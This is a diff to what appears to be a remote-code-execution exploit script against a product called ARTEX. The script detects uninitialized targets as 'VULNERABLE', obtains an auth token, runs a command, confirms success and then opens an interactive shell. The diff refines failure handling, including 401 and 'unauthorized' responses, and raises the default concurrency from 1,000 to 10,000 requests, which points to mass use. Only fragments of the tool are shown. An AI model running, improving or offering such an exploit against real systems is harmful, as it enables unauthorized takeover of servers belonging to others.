@@ -231,7 +231,7 @@ def main(args):
         return
         
     initialized = check_init_json.get("initialized", None)
-    if initialized != True and initialized != None:
+    if initialized == False:
         print("[!] ARTEX is NOT initialized! (VULNERABLE)")
         return
 
@@ -309,7 +309,7 @@ def main(args):
         return
 
     token = auth_json.get("token", "")
-    if token == "":
+    if token == "" or token == None:
         print(f"[-] Exploit failed. ({auth.status_code})")
         return
     
@@ -340,14 +340,15 @@ def main(args):
     if rce_json.get("output") == "artxploit\n":
         print("[+] Exploit success.")
         interative(token, target, timeout)
+    elif rce.status_code == 401:
+        print(f"[-] RCE failed: Authentication failed.")
+        return
     elif rce.status_code != 200:
         print(f"[-] RCE failed. [{rce.status_code}]")
         return
-    elif rce_json.get("is_error") == True:
-        # The command did run but the command has failed. This means RCE is still working.
-        print("[!] RCE confirmation code returned an error.")
-        print("[+] Exploit success.")
-        interative(token, target, timeout)
+    elif rce_json.get("error", "") != "":
+        # {"error":"未授权"}
+        print(f"[-] RCE failed: Authentication failed.")
 
 if __name__ == "__main__":
     parser = ArgumentParser(
@@ -377,7 +378,7 @@ if __name__ == "__main__":
         "--concurrency",
         help="Set concurrency for thread requests (default: 10,000)",
         type=int,
-        default=1000
+        default=10000
     )
     parser.add_argument(
         "-r", "--requests",
